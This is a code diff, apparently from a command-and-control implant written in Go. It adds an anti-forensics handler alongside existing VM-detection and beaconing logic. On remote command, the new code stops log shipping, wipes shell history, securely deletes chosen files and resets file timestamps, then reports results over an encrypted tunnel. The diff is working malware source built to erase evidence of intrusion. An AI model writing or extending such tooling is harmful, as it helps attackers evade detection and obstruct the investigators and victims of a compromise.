@@ -327,6 +327,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runVMDetect(conn, sess, v)
+		case proto.TypeAntiForenStart:
+			var a proto.AntiForenStart
+			if err := json.Unmarshal(env.Payload, &a); err != nil {
+				continue
+			}
+			go runAntiForen(conn, sess, a)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -1979,6 +1985,60 @@ func runVMDetect(conn net.Conn, sess *crypto.Session, v proto.VMDetectStart) {
 		SessionID: v.SessionID,
 		Signals:   signals,
 		Count:     len(signals),
+		Done:      true,
+	})
+}
+
+// runAntiForen runs the anti-forensics primitives.
+func runAntiForen(conn net.Conn, sess *crypto.Session, a proto.AntiForenStart) {
+	opts := recon2.ForensicsOptions{DryRun: a.DryRun}
+	var results []recon2.ForensicsResult
+
+	switch a.Action {
+	case "logstop":
+		results = recon2.LogShippingStop(opts)
+	case "history":
+		results = recon2.HistoryWipe(opts)
+	case "all":
+		results = recon2.All(a.Paths, opts)
+	case "secure_delete":
+		for _, p := range a.Paths {
+			if r, _ := recon2.SecureDelete(p, 3, opts); r.Action != "" {
+				results = append(results, r)
+			}
+		}
+	case "timestamp":
+		for _, p := range a.Paths {
+			if r, _ := recon2.TimestampReset(p, time.Time{}, opts); r.Action != "" {
+				results = append(results, r)
+			}
+		}
+	default:
+		sendTunnelAck(conn, sess, proto.TypeAntiForenData, proto.AntiForenData{
+			SessionID: a.SessionID,
+			Results:   []string{"error|unknown action: " + a.Action + "|false|"},
+			Count:     1,
+			Done:      true,
+		})
+		return
+	}
+
+	var lines []string
+	for _, r := range results {
+		okStr := "false"
+		if r.OK {
+			okStr = "true"
+		}
+		detail := r.Detail
+		if r.Err != "" {
+			detail = "err=" + r.Err
+		}
+		lines = append(lines, r.Action+"|"+r.Target+"|"+okStr+"|"+detail)
+	}
+	sendTunnelAck(conn, sess, proto.TypeAntiForenData, proto.AntiForenData{
+		SessionID: a.SessionID,
+		Results:   lines,
+		Count:     len(lines),
 		Done:      true,
 	})
 }
